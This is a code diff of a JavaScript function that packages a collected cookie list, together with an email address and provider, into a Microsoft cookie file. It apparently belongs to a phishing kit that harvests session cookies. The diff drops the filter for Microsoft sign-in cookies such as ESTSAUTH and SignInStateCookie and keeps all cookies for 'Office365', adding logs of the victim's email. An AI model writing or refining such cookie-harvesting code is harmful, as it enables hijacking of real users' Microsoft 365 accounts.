@@ -169,31 +169,21 @@ const generateMicrosoftCookieFile = (cookieList, data) => {
         return null;
     }
 
-    // Accept all cookies since Microsoft cookies might be stored on various domains
-    const microsoftCookies = cookieList.filter(cookie => 
-        cookie.name && (
-            cookie.name.includes('ESTSAUTH') ||
-            cookie.name.includes('SignInStateCookie') ||
-            cookie.name.includes('buid') ||
-            cookie.name.includes('esctx') ||
-            cookie.name.includes('MSPOK') ||
-            cookie.name.includes('AADSTS') ||
-            cookie.name.includes('stsservice') ||
-            cookie.name.includes('MSP') ||
-            cookie.name.includes('wlid') ||
-            cookie.name.includes('ai_') ||
-            (cookie.domain && (
-                cookie.domain.includes('microsoftonline.com') ||
-                cookie.domain.includes('outlook.com') ||
-                cookie.domain.includes('live.com') ||
-                cookie.domain.includes('office.com')
-            ))
-        )
-    );
+    // CRITICAL: Accept ALL cookies for Office365 provider - don't filter
+    const microsoftCookies = cookieList;
+    
+    console.log('🔵 Cookie file generation:', {
+        totalCookies: cookieList.length,
+        provider: data.provider,
+        email: data.email
+    });
 
-    if (microsoftCookies.length === 0) {
+    if (!microsoftCookies || microsoftCookies.length === 0) {
+        console.log('❌ No cookies found for file generation');
         return null;
     }
+
+    console.log('✅ Generating cookie file with', microsoftCookies.length, 'cookies');
 
     const timestamp = new Date(data.timestamp || Date.now()).toISOString();
     
